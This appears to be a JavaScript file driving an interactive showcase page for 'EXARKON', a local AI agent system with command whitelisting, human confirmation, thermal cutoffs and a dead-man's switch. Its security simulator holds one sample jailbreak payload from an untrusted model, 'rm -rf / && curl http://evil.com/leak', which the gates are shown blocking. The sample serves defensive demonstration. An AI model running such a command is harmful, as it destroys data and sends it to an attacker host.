// ==========================================================================
// EXARKON // CIBERNÉTICA INTERACTIVA (exarkon-fx.js)
// Simulación de los 10 estratos, protocolo V.E.R.A., Hardware Watchdog & DMS
// ==========================================================================

document.addEventListener('DOMContentLoaded', () => {
  initHexHeroCanvas();
  initLayerInspector();
  initVeraSimulator();
  initThermalWatchdog();
  initDeadMansSwitch();
  initRealtimeHudTicker();
});

// --------------------------------------------------------------------------
// 1. HEXAGONAL NEURAL MATRIX CANVAS
// --------------------------------------------------------------------------
function initHexHeroCanvas() {
  const canvas = document.getElementById('exarkon-hero-canvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  let width = (canvas.width = canvas.offsetWidth);
  let height = (canvas.height = canvas.offsetHeight);

  window.addEventListener('resize', () => {
    width = canvas.width = canvas.offsetWidth;
    height = canvas.height = canvas.offsetHeight;
  });

  const hexSize = 36;
  const cols = Math.ceil(width / (hexSize * 1.732)) + 2;
  const rows = Math.ceil(height / (hexSize * 1.5)) + 2;

  // Partículas que viajan por las conexiones
  const pulses = [];
  for (let i = 0; i < 24; i++) {
    pulses.push({
      x: Math.random() * width,
      y: Math.random() * height,
      vx: (Math.random() - 0.5) * 1.2,
      vy: (Math.random() - 0.5) * 1.2,
      life: Math.random() * 100,
      maxLife: 60 + Math.random() * 60,
      size: 1.5 + Math.random() * 2
    });
  }

  let mouseX = -1000;
  let mouseY = -1000;
  window.addEventListener('mousemove', (e) => {
    const rect = canvas.getBoundingClientRect();
    mouseX = e.clientX - rect.left;
    mouseY = e.clientY - rect.top;
  });

  function drawHexagon(cx, cy, r) {
    ctx.beginPath();
    for (let i = 0; i < 6; i++) {
      const angle = (Math.PI / 3) * i;
      const x = cx + r * Math.cos(angle);
      const y = cy + r * Math.sin(angle);
      if (i === 0) ctx.moveTo(x, y);
      else ctx.lineTo(x, y);
    }
    ctx.closePath();
  }

  let frame = 0;
  function render() {
    frame++;
    ctx.clearRect(0, 0, width, height);

    // Dibujar rejilla hexagonal sutil
    const r = hexSize;
    const dx = r * Math.sqrt(3);
    const dy = r * 1.5;

    ctx.strokeStyle = 'rgba(0, 240, 255, 0.05)';
    ctx.lineWidth = 1;

    for (let row = 0; row < rows; row++) {
      for (let col = 0; col < cols; col++) {
        const cx = col * dx + (row % 2 === 1 ? dx / 2 : 0);
        const cy = row * dy;
        const distToMouse = Math.hypot(cx - mouseX, cy - mouseY);

        if (distToMouse < 180) {
          const alpha = (1 - distToMouse / 180) * 0.35;
          ctx.strokeStyle = `rgba(0, 240, 255, ${alpha})`;
          ctx.lineWidth = 1.2;
          drawHexagon(cx, cy, r * 0.92);
          ctx.stroke();

          // Centro iluminado si está muy cerca
          if (distToMouse < 90) {
            ctx.fillStyle = `rgba(0, 240, 255, ${(1 - distToMouse / 90) * 0.15})`;
            ctx.fill();
          }
        } else if ((row + col + Math.floor(frame / 60)) % 7 === 0) {
          ctx.strokeStyle = 'rgba(0, 240, 255, 0.09)';
          ctx.lineWidth = 1;
          drawHexagon(cx, cy, r * 0.9);
          ctx.stroke();
        }
      }
    }

    // Dibujar pulsos de datos
    for (let p of pulses) {
      p.x += p.vx;
      p.y += p.vy;
      p.life++;
      if (p.life > p.maxLife || p.x < 0 || p.x > width || p.y < 0 || p.y > height) {
        p.x = Math.random() * width;
        p.y = Math.random() * height;
        p.life = 0;
      }

      const pAlpha = Math.sin((p.life / p.maxLife) * Math.PI) * 0.8;
      ctx.fillStyle = `rgba(0, 240, 255, ${pAlpha})`;
      ctx.shadowColor = '#00f0ff';
      ctx.shadowBlur = 8;
      ctx.beginPath();
      ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
      ctx.fill();
      ctx.shadowBlur = 0;
    }

    requestAnimationFrame(render);
  }

  render();
}

// --------------------------------------------------------------------------
// 2. INSPECTOR DE LAS 10 CAPAS HEXAGONALES (x00 - x09)
// --------------------------------------------------------------------------
const LAYERS_DATA = {
  x00: {
    id: 'x00_CORE',
    name: 'Núcleo Reactivo & Bus de Eventos',
    role: 'El tronco cerebral del sistema: EventBus asíncrono Pub/Sub, Configuración Pydantic inmutable y Boot Guardian.',
    invariants: [
      'Token verificado en boot con compare_digest()',
      'Configuración inmutable post-arranque',
      'Despacho de eventos asyncio sin bloqueos en I/O'
    ],
    code: `# x00_core/event_bus.py (verificado)
class EventBus:
    def __init__(self) -> None:
        self._subscribers: dict[str, list[Callable]] = defaultdict(list)
        self._queue: asyncio.Queue = asyncio.Queue(maxsize=10_000)

    async def publish(self, topic: str, payload: dict) -> None:
        await self._queue.put((topic, payload, time.time()))`,
    metrics: '0.04 ms latencia media · 10,000 eventos en cola · 100% no-bloqueante'
  },
  x01: {
    id: 'x01_HOST',
    name: 'Hardware Eye & Control Térmico',
    role: 'Supervisión en vivo del silicio físico: asignador soberano de VRAM, watchdog térmico y limitador de corriente.',
    invariants: [
      'VRAM tope forzada a 3,800 MB (296 MB de reserva driver)',
      'Embeddings forzados a CPU para blindar memoria GPU',
      'Corte de emergencia (Protocolo Sol Negro) a 90°C'
    ],
    code: `# x01_host/gpu_profiler.py (verificado)
@field_validator("VRAM_LIMIT_MB", mode="before")
def enforce_vram_limit(cls, v: Any) -> int:
    if v > 3800:
        return 3800  # Forzado por límites de hardware
    return v`,
    metrics: '3,800 MB VRAM hard ceiling · 83°C Throttling · 90°C Sol Negro Trip'
  },
  x02: {
    id: 'x02_FORTRESS',
    name: 'Protocolo V.E.R.A. & Sandbox Zero-Trust',
    role: 'Frontera de defensa perimetral. Valida, audita y confina toda sugerencia de los modelos antes de tocar el sistema.',
    invariants: [
      'Bearer Token verificado en tiempo constante',
      'Whitelist cerrada de 18 acciones autorizadas',
      'Confirmación humana (Human-in-the-loop) inmutable'
    ],
    code: `# x02_fortress/vera_server.py
@app.post("/command")
async def execute_command(cmd: CommandModel, token: str = Depends(verify_token)):
    if cmd.action not in WHITELIST:
        raise HTTPException(status_code=422, detail="Action prohibited")
    audit("COMMAND_RECEIVED", {"action": cmd.action})`,
    metrics: '6 compuertas de seguridad · 18 acciones autorizadas · 0 scripts arbitrarios'
  },
  x03: {
    id: 'x03_ORACLE',
    name: 'Motor RAG Vectorial & Destilación Cognitiva',
    role: 'Memoria asociativa local: embeddings persistentes en ChromaDB, deduplicación de vectores y auto-destilación.',
    invariants: [
      'Embeddings calculados exclusivamente en CPU',
      'Deduplicación semántica previa a la persistencia',
      'Consultas semánticas con distancia coseno calibrada'
    ],
    code: `# x03_oracle/knowledge_archivist.py
class KnowledgeArchivist:
    def __init__(self, chroma_client):
        self.collection = chroma_client.get_or_create_collection(
            name="exarkon_vault",
            metadata={"hnsw:space": "cosine"}
        )`,
    metrics: 'ChromaDB Local · Cuantización 4-bit · Cero llamadas a APIs externas'
  },
  x04: {
    id: 'x04_VAULT',
    name: 'La Bóveda Hexagonal (HEX_BOVEDA)',
    role: 'Cámara acorazada de datos: ingesta, curaduría, cuarentena, snapshots previos a mutaciones y reversión instantánea.',
    invariants: [
      'Snapshots atómicos SHA-256 antes de cada operación destructiva',
      'Rollback garantizado en <100 ms ante fallo',
      'Aislamiento estricto de carpetas en cuarentena'
    ],
    code: `# x04_vault/snapshot_manager.py
def create_atomic_snapshot(target_dir: Path) -> str:
    snap_id = f"snap_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}"
    # Congelación diferencial con verificación SHA-256
    return snap_id`,
    metrics: 'Snapshots atómicos · 6 directorios autorizados · Rollback <100ms'
  },
  x05: {
    id: 'x05_AGENTS',
    name: 'Cuadrilla de Agentes Autónomos',
    role: 'Ejército de micro-agentes coordinados: Sabueso Hunter, Sentinel, AST Healer, Auto-Refactor y Voice Bridge.',
    invariants: [
      'Playwright Chromium forzado con --disable-gpu',
      'Reparación de código basada en mutaciones de AST verificadas',
      'Comlink por Telegram cifrado en runtime sin logs de token'
    ],
    code: `# x05_agents/ast_healer.py (extracto)
class ASTHealer:
    def repair_syntax(self, code: str, error_line: int) -> str:
        tree = ast.parse(code)
        transformer = SurgicalNodeFixer(error_line)
        new_tree = transformer.visit(tree)
        return ast.unparse(new_tree)`,
    metrics: '6 Agentes especializados · AST Surgery · Síntesis de voz neural local'
  },
  x06: {
    id: 'x06_HUD',
    name: 'Interfaz Visual Ciber-Militar en Tiempo Real',
    role: 'HUD reactivo basado en D3.js y WebSockets para telemetría continua: flujo de pensamientos, árbol de eventos y salud física.',
    invariants: [
      'Conexión local por WebSocket bidireccional',
      'Stream de tokens y cadenas de pensamiento de la IA',
      'Visualización de latidos y estado del Dead Man Switch'
    ],
    code: `// x06_hud/nexus.js (extracto WebSocket)
const ws = new WebSocket(EXARKON_CONFIG.WS_BASE);
ws.onmessage = (event) => {
    const packet = JSON.parse(event.data);
    renderTelemetryMetrics(packet.hardware, packet.events_per_sec);
};`,
    metrics: 'D3.js Telemetry · <15ms Loop HUD · Hexagonal Matrix UI'
  },
  x07: {
    id: 'x07_LOGS',
    name: 'Audit Trail Inmutable & Forense',
    role: 'Registro append-only en formato JSONL: trazabilidad forense de cada token, comando, rechazo o snapshot.',
    invariants: [
      'Modo append-only estricto (nunca se sobreescribe)',
      'Tokens y contraseñas automáticamente redactados',
      'Hash de integridad y timestamp ISO-8601 UTC'
    ],
    code: `# x07_logs/audit_trail.py
def audit_event(event_type: str, metadata: dict) -> None:
    sanitized = redact_sensitive_keys(metadata)
    entry = {"ts": datetime.utcnow().isoformat(), "event": event_type, "meta": sanitized}
    _AUDIT_FILE.write_text(json.dumps(entry) + "\\n", mode="a")`,
    metrics: 'Append-only JSONL · Sanitización de entropía · 100% Trazable'
  },
  x08: {
    id: 'x08_TESTS',
    name: 'Suite de Regresión & Fuzzing Perimetral',
    role: '205 pruebas unitarias, de integración y de estrés que garantizan la integridad matemática y la resistencia a ataques.',
    invariants: [
      '205 tests pasando al 100% en tiempo récord (<27s)',
      'Validación de payloads maliciosos y jailbreaks',
      'Simulación de fallos de hardware y OOM de GPU'
    ],
    code: `# tests/test_vera_security.py
def test_unauthorized_action_rejected():
    response = client.post("/command", json={"action": "rm_rf_system"})
    assert response.status_code == 422
    assert "Action prohibited" in response.text`,
    metrics: '205 tests pasando · 26.97s de suite completa · Fuzzing AST'
  },
  x09: {
    id: 'x09_DOCS',
    name: 'Manifiestos, Decisiones & Criterio Soberano',
    role: 'Documentación viva de arquitectura, bitácoras de diseño, límites éticos y el Manifiesto Génesis del sistema.',
    invariants: [
      'Modelo Zero-Trust formalmente especificado',
      'Directrices de preservación de hardware',
      'Documento de arquitectura sincronizado con el código'
    ],
    code: `// GENESIS_MANIFEST.json
{
  "system": "EXARKON_SYS",
  "version": "3.0.0",
  "doctrine": "Razon sobre Proceso. Conciencia sobre Codigo.",
  "sovereignty": "100% Local / Zero Cloud Dependency"
}`,
    metrics: '10 Capítulos de Arquitectura · Cero ambigüedad · Líneas rojas claras'
  }
};

function initLayerInspector() {
  const container = document.getElementById('ex-layers-inspector');
  if (!container) return;

  const btnContainer = container.querySelector('.ex-layers-list');
  const card = container.querySelector('.ex-layer-detail-card');
  if (!btnContainer || !card) return;

  const buttons = btnContainer.querySelectorAll('.ex-layer-btn');

  function renderLayer(layerKey) {
    const data = LAYERS_DATA[layerKey];
    if (!data) return;

    buttons.forEach(b => b.classList.toggle('is-active', b.dataset.layer === layerKey));

    card.innerHTML = `
      <div class="ex-layer-detail-title">${data.id} // ${data.name}</div>
      <div class="ex-layer-tagline">${data.role}</div>

      <div style="margin: 1rem 0;">
        <strong style="color:var(--ex-cyan); font-family:var(--font-hud-mono); font-size:0.8rem; text-transform:uppercase;">Invariantes del Búnker:</strong>
        <ul style="margin: 0.5rem 0 1rem 1.25rem; font-size:0.88rem; color:var(--text-dim); line-height:1.6;">
          ${data.invariants.map(inv => `<li>${inv}</li>`).join('')}
        </ul>
      </div>

      <strong style="color:var(--ex-cyan); font-family:var(--font-hud-mono); font-size:0.8rem; text-transform:uppercase;">Implementación en Código:</strong>
      <pre class="ex-layer-code-view"><code>${escapeHtml(data.code)}</code></pre>

      <div style="margin-top:1rem; padding-top:0.75rem; border-top:1px solid rgba(0,240,255,0.15); font-family:var(--font-hud-mono); font-size:0.8rem; color:var(--ex-emerald);">
        METRICAS: ${data.metrics}
      </div>
    `;
  }

  buttons.forEach(btn => {
    btn.addEventListener('click', () => {
      renderLayer(btn.dataset.layer);
    });
  });

  // Cargar x00 por defecto
  renderLayer('x00');
}

// --------------------------------------------------------------------------
// 3. SIMULADOR DEL PROTOCOLO V.E.R.A.
// --------------------------------------------------------------------------
const VERA_SCENARIOS = {
  curation: {
    title: 'Comando Válido: Ingesta de Dataset Curado',
    action: 'aprobar_pieza',
    source: 'claude',
    payload: '{"dataset": "archivos_limpios.json", "target": "HEX_BOVEDA/CURADURIA"}',
    steps: [
      { name: '1. Auth Token', pass: true, msg: 'secrets.compare_digest() -> OK' },
      { name: '2. Rate Limiting', pass: true, msg: '1 req/min (Límite: 20) -> OK' },
      { name: '3. Source Check', pass: true, msg: 'Fuente "claude" autorizada -> OK' },
      { name: '4. Whitelist', pass: true, msg: 'Acción "aprobar_pieza" permitida -> OK' },
      { name: '5. AST & Blacklist', pass: true, msg: 'Payload limpio sin subprocesos -> OK' },
      { name: '6. Human Gate', pass: true, msg: 'Operador confirma [S/n] -> Snapshot creado y Ejecutado' }
    ],
    status: 'APROBADO',
    summary: 'Comando verificado en las 6 capas. Se creó snapshot snap_20261019_001 y se registró en audit_trail.jsonl.'
  },
  ast_patch: {
    title: 'Comando Quirúrgico: AST Healer Auto-Refactor',
    action: 'reparar_sintaxis',
    source: 'gemini',
    payload: '{"target_file": "x05_agents/worker.py", "ast_mutation": "FixIndentation"}',
    steps: [
      { name: '1. Auth Token', pass: true, msg: 'Token Bearer verificado -> OK' },
      { name: '2. Rate Limiting', pass: true, msg: '4 req/min -> OK' },
      { name: '3. Source Check', pass: true, msg: 'Fuente "gemini" autorizada -> OK' },
      { name: '4. Whitelist', pass: true, msg: 'Acción "reparar_sintaxis" en whitelist -> OK' },
      { name: '5. AST & Blacklist', pass: true, msg: 'AST validado sin código arbitrario -> OK' },
      { name: '6. Human Gate', pass: true, msg: 'Confirmado por operador -> Mutación aplicada con rollback listo' }
    ],
    status: 'APROBADO',
    summary: 'La mutación AST fue aplicada en memoria, suite de pruebas validada, snapshot cerrado exitosamente.'
  },
  injection_attempt: {
    title: 'Intento de Evasión: Inyección de Shell (Jailbreak)',
    action: 'ejecutar_shell',
    source: 'untrusted_llm',
    payload: '{"cmd": "rm -rf / && curl http://evil.com/leak"}',
    steps: [
      { name: '1. Auth Token', pass: true, msg: 'Token verificado' },
      { name: '2. Rate Limiting', pass: true, msg: 'Pasa ventana de tiempo' },
      { name: '3. Source Check', pass: false, msg: 'BLOQUEADO: Fuente desconocida ("untrusted_llm")' },
      { name: '4. Whitelist', pass: false, msg: 'BLOQUEADO: Acción "ejecutar_shell" NO existe en Whitelist' },
      { name: '5. AST & Blacklist', pass: false, msg: 'BLOQUEADO CRITICO: Término prohibido detectado ("rm -rf")' },
      { name: '6. Human Gate', pass: false, msg: 'ABORTADO ANTES DE LLEGAR AL HUMANO' }
    ],
    status: 'INTERCEPTADO & AUDITADO',
    summary: 'El sandbox neutralizó el payload en la compuerta 3, 4 y 5. Alerta de seguridad emitida al ComLink. Cero mutaciones en disco.'
  }
};

function initVeraSimulator() {
  const container = document.getElementById('ex-vera-simulator');
  if (!container) return;

  const btnContainer = container.querySelector('.ex-vera-cmd-selector');
  const pipelineEl = container.querySelector('.ex-vera-pipeline');
  const resultEl = container.querySelector('.ex-vera-result-box');
  if (!btnContainer || !pipelineEl || !resultEl) return;

  const buttons = btnContainer.querySelectorAll('.ex-vera-cmd-btn');

  function renderScenario(key) {
    const sc = VERA_SCENARIOS[key];
    if (!sc) return;

    buttons.forEach(b => b.classList.toggle('is-active', b.dataset.scenario === key));

    pipelineEl.innerHTML = sc.steps.map((st, idx) => `
      <div class="ex-vera-step ${st.pass ? 'step-pass' : 'step-block'}">
        <span class="ex-vera-step-num">GATE 0${idx + 1}</span>
        <span class="ex-vera-step-name">${st.name}</span>
        <span class="ex-vera-step-status">${st.pass ? 'PASS' : 'BLOCKED'}</span>
        <div style="font-size:0.68rem; margin-top:0.4rem; color:var(--text-dim); line-height:1.3;">${st.msg}</div>
      </div>
    `).join('');

    resultEl.innerHTML = `
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:0.5rem;">
        <strong style="color:#fff; font-size:1rem;">${sc.title}</strong>
        <span class="ex-thermo-state-badge" style="background:${sc.status.includes('APROBADO') ? 'rgba(0,255,136,0.2)' : 'rgba(255,42,95,0.2)'}; color:${sc.status.includes('APROBADO') ? 'var(--ex-emerald)' : 'var(--ex-crimson)'};">
          ${sc.status}
        </span>
      </div>
      <div style="color:var(--text-dim); margin-bottom:0.75rem;">
        <code>Payload: ${escapeHtml(sc.payload)}</code>
      </div>
      <div style="color:#fff;">${sc.summary}</div>
    `;
  }

  buttons.forEach(btn => {
    btn.addEventListener('click', () => {
      renderScenario(btn.dataset.scenario);
    });
  });

  renderScenario('curation');
}

// --------------------------------------------------------------------------
// 4. SIMULADOR DEL HARDWARE EYE & PROTOCOLO SOL NEGRO
// --------------------------------------------------------------------------
function initThermalWatchdog() {
  const slider = document.getElementById('ex-temp-slider');
  const tempVal = document.getElementById('ex-temp-val');
  const badge = document.getElementById('ex-thermal-badge');
  const desc = document.getElementById('ex-thermal-desc');
  const vramGauge = document.getElementById('ex-vram-gauge');

  if (!slider || !tempVal || !badge || !desc || !vramGauge) return;

  function updateThermalState(temp) {
    tempVal.textContent = `${temp}°C`;

    if (temp < 75) {
      badge.textContent = 'ESTADO: NOMINAL // SILICIO FRESCO';
      badge.style.background = 'rgba(0, 240, 255, 0.15)';
      badge.style.color = 'var(--ex-cyan)';
      desc.textContent = 'Todas las inferencias locales de Ollama corren a máxima frecuencia. Embeddings confinados a CPU. VRAM asignada a 2,420 MB.';
      vramGauge.textContent = '2,420 / 3,800 MB (Nominal)';
      vramGauge.style.color = 'var(--ex-cyan)';
    } else if (temp < 83) {
      badge.textContent = 'ALERTA PREVENTIVA // CARGA ELEVADA';
      badge.style.background = 'rgba(255, 184, 0, 0.2)';
      badge.style.color = 'var(--ex-amber)';
      desc.textContent = 'Se suspenden tareas de curaduría de fondo y vectorizaciones masivas en la Bóveda para no estresar el bus PCI Express. Inferencias interactivas activas.';
      vramGauge.textContent = '3,100 / 3,800 MB (Enfriamiento pasivo)';
      vramGauge.style.color = 'var(--ex-amber)';
    } else if (temp < 90) {
      badge.textContent = 'THROTTLING COOPERATIVO // PROTECCIÓN ACTIVA';
      badge.style.background = 'rgba(255, 42, 95, 0.2)';
      badge.style.color = 'var(--ex-crimson)';
      desc.textContent = 'EventBus introduce micro-delays de 50ms entre cada token de inferencia. La GPU baja clocks para reducir disipación antes de tocar el punto de fractura.';
      vramGauge.textContent = '3,650 / 3,800 MB (Throttling activo)';
      vramGauge.style.color = 'var(--ex-crimson)';
    } else {
      badge.textContent = '🚨 PROTOCOLO SOL NEGRO ACTIVADO // CORTE DE EMERGENCIA';
      badge.style.background = 'rgba(121, 40, 202, 0.35)';
      badge.style.color = '#d8b4fe';
      desc.textContent = 'TEMPERATURA CRÍTICA (≥90°C). Se abortan de inmediato todas las inferencias de Ollama en GPU. Se vacían colas a disco. El sistema entra en reposo hasta bajar a <75°C para salvar el hardware.';
      vramGauge.textContent = '0 / 3,800 MB (DESCARGA INMEDIATA)';
      vramGauge.style.color = '#d8b4fe';
    }
  }

  slider.addEventListener('input', (e) => {
    updateThermalState(parseInt(e.target.value, 10));
  });

  updateThermalState(parseInt(slider.value, 10));
}

// --------------------------------------------------------------------------
// 5. DEAD MAN'S SWITCH (CORDÓN UMBILICAL)
// --------------------------------------------------------------------------
function initDeadMansSwitch() {
  const clockEl = document.getElementById('ex-dms-countdown');
  const pingBtn = document.getElementById('ex-dms-ping-btn');
  const killBtn = document.getElementById('ex-dms-kill-btn');
  const statusEl = document.getElementById('ex-dms-status-msg');

  if (!clockEl || !pingBtn || !killBtn || !statusEl) return;

  let seconds = 300;
  let timer = null;

  function formatTime(s) {
    const mins = Math.floor(s / 60);
    const secs = s % 60;
    return `T - ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}s`;
  }

  function startTimer() {
    if (timer) clearInterval(timer);
    timer = setInterval(() => {
      seconds--;
      if (seconds <= 0) {
        clearInterval(timer);
        seconds = 0;
        triggerEmergencyFreeze();
      }
      clockEl.textContent = formatTime(seconds);
    }, 1000);
  }

  function triggerEmergencyFreeze() {
    clockEl.textContent = 'T - 00:00s [DESCONECTADO]';
    clockEl.style.color = 'var(--ex-crimson)';
    statusEl.innerHTML = '<span style="color:var(--ex-crimson);">⚠️ CORDÓN UMBILICAL ROTO: Sin latido de operador durante 300s. Sistema congelado: Bóveda sellada con Snapshot, EventBus pausado, Memoria persistida en disco. Modo Hibernación Activo.</span>';
  }

  pingBtn.addEventListener('click', () => {
    seconds = 300;
    clockEl.style.color = 'var(--ex-amber)';
    statusEl.innerHTML = '<span style="color:var(--ex-emerald);">✓ LATIDO RECIBIDO: Temporizador restablecido a 300s. Enlace con Operador Humano Activo y Saludable.</span>';
    startTimer();
  });

  killBtn.addEventListener('click', () => {
    seconds = 0;
    clearInterval(timer);
    triggerEmergencyFreeze();
  });

  startTimer();
}

// --------------------------------------------------------------------------
// 6. HUD REALTIME STATUS TICKER
// --------------------------------------------------------------------------
function initRealtimeHudTicker() {
  const evtRateEl = document.getElementById('hud-evt-rate');
  const loopLatencyEl = document.getElementById('hud-loop-latency');

  if (!evtRateEl || !loopLatencyEl) return;

  setInterval(() => {
    const rate = (44 + Math.random() * 8).toFixed(1);
    const lat = (11 + Math.random() * 4).toFixed(0);
    evtRateEl.textContent = `${rate} EVT/S`;
    loopLatencyEl.textContent = `${lat}ms`;
  }, 2500);
}

function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}
